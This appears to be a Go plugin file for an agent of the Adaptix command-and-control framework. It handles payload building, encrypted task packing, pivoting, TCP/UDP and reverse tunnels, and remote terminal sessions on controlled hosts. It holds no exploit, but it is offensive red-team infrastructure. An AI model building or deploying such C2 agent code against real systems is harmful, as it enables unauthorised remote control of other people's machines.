package main

import (
	"encoding/hex"
	"encoding/json"
	"errors"
	"math/rand"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
)

const (
	OS_UNKNOWN = 0
	OS_WINDOWS = 1
	OS_LINUX   = 2
	OS_MAC     = 3

	TYPE_TASK       = 1
	TYPE_BROWSER    = 2
	TYPE_JOB        = 3
	TYPE_TUNNEL     = 4
	TYPE_PROXY_DATA = 5

	MESSAGE_INFO    = 5
	MESSAGE_ERROR   = 6
	MESSAGE_SUCCESS = 7

	DOWNLOAD_STATE_RUNNING  = 1
	DOWNLOAD_STATE_STOPPED  = 2
	DOWNLOAD_STATE_FINISHED = 3
	DOWNLOAD_STATE_CANCELED = 4
)

type Teamserver interface {
	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsUploadGetFileContent(fileId string) ([]byte, error)
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error
	TsClientGuiDisks(taskData adaptix.TaskData, jsonDrives string)
	TsClientGuiFiles(taskData adaptix.TaskData, path string, jsonFiles string)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiProcess(taskData adaptix.TaskData, jsonFiles string)
}

type PluginAgent struct{}

type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &PluginAgent{}
}

func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	for _, transportProfile := range profile.ListenerProfiles {
		var listenerMap map[string]any
		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
			return nil, err
		}

		agentProfile, err := AgentGenerateProfile(profile.AgentConfig, transportProfile.Watermark, listenerMap)
		if err != nil {
			return nil, err
		}

		agentProfiles = append(agentProfiles, agentProfile)
	}

	return agentProfiles, nil
}

func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	if len(agentProfiles) == 0 {
		return nil, "", errors.New("listener profile is required")
	}
	if len(agentProfiles) != 1 {
		return nil, "", errors.New("CStesthihi agent supports exactly one listener profile")
	}

	return AgentGenerateBuild(profile.AgentConfig, agentProfiles[0], nil)
}

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	agentData, err := CreateAgent(beat)
	if err != nil {
		return adaptix.AgentData{}, nil, err
	}

	return agentData, &ExtenderAgent{}, nil
}

func makeProxyTask(packData []byte) adaptix.TaskData {
	return adaptix.TaskData{
		Type: adaptix.TASK_TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}
}

func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	return AgentEncryptData(data, key)
}

func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	return AgentDecryptData(data, key)
}

func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	return PackTasks(agentData, tasks)
}

func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	packData, err := PackPivotTasks(pivotId, data)
	if err != nil {
		return adaptix.TaskData{}, err
	}

	randomBytes := make([]byte, 16)
	rand.Read(randomBytes)

	return adaptix.TaskData{
		TaskId: hex.EncodeToString(randomBytes)[:8],
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   packData,
		Sync:   false,
	}, nil
}

func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	return CreateTask(Ts, agentData, args)
}

func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	taskData := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	resultTasks := ProcessTasksResult(Ts, agentData, taskData, decryptedData)
	for _, task := range resultTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}

	return nil
}

func SyncBrowserDisks(ts Teamserver, taskData adaptix.TaskData, drivesSlice []adaptix.ListingDrivesDataWin) {
	jsonDrives, err := json.Marshal(drivesSlice)
	if err != nil {
		return
	}

	ts.TsClientGuiDisks(taskData, string(jsonDrives))
}

func SyncBrowserFiles(ts Teamserver, taskData adaptix.TaskData, path string, filesSlice []adaptix.ListingFileDataWin) {
	jsonDrives, err := json.Marshal(filesSlice)
	if err != nil {
		return
	}

	ts.TsClientGuiFiles(taskData, path, string(jsonDrives))
}

func SyncBrowserFilesStatus(ts Teamserver, taskData adaptix.TaskData) {
	ts.TsClientGuiFilesStatus(taskData)
}

func SyncBrowserProcess(ts Teamserver, taskData adaptix.TaskData, processlist []adaptix.ListingProcessDataWin) {
	jsonProcess, err := json.Marshal(processlist)
	if err != nil {
		return
	}

	ts.TsClientGuiProcess(taskData, string(jsonProcess))
}

func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: TunnelMessageConnectTCP,
		ConnectUDP: TunnelMessageConnectUDP,
		WriteTCP:   TunnelMessageWriteTCP,
		WriteUDP:   TunnelMessageWriteUDP,
		Pause:      TunnelMessagePause,
		Resume:     TunnelMessageResume,
		Close:      TunnelMessageClose,
		Reverse:    TunnelMessageReverse,
	}
}

func TunnelMessageConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	packData, _ := TunnelCreateTCP(channelId, address, port)
	return makeProxyTask(packData)
}

func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	packData, _ := TunnelCreateUDP(channelId, address, port)
	return makeProxyTask(packData)
}

func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
	packData, _ := TunnelWriteTCP(channelId, data)
	return makeProxyTask(packData)
}

func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
	packData, _ := TunnelWriteUDP(channelId, data)
	return makeProxyTask(packData)
}

func TunnelMessagePause(channelId int) adaptix.TaskData {
	return makeProxyTask(nil)
}

func TunnelMessageResume(channelId int) adaptix.TaskData {
	return makeProxyTask(nil)
}

func TunnelMessageClose(channelId int) adaptix.TaskData {
	packData, _ := TunnelClose(channelId)
	return makeProxyTask(packData)
}

func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
	packData, _ := TunnelReverse(tunnelId, port)
	return makeProxyTask(packData)
}

func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: TerminalMessageStart,
		Write: TerminalMessageWrite,
		Close: TerminalMessageClose,
	}
}

func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	packData, _ := TerminalStart(terminalId, program, sizeH, sizeW)
	return makeProxyTask(packData)
}

func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	packData, _ := TerminalWrite(terminalId, data)
	return makeProxyTask(packData)
}

func TerminalMessageClose(terminalId int) adaptix.TaskData {
	packData, _ := TerminalClose(terminalId)
	return makeProxyTask(packData)
}
